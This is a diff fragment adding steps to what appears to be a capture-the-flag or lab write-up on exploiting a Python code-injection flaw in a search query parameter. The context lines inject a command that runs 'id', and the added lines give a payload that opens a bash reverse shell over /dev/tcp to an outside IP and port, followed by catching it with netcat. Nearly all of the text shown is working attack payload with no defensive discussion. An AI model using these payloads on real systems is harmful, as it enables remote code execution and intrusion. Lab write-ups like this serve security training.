@@ -263,3 +263,8 @@ engine=Google&query=islam')%2b'kare'+%23+
 engine=Google&query=islam')%2b__import__('os').system('id')+%23+
 ```
 - and we get the id now we go to reverse shell
+- go to site and paste this payload
+```
+'),__import__('os').system('bash -c "bash -i >& /dev/tcp/10.10.16.6/1337 0>&1"')#
+```
+- run netcat and we got ashell
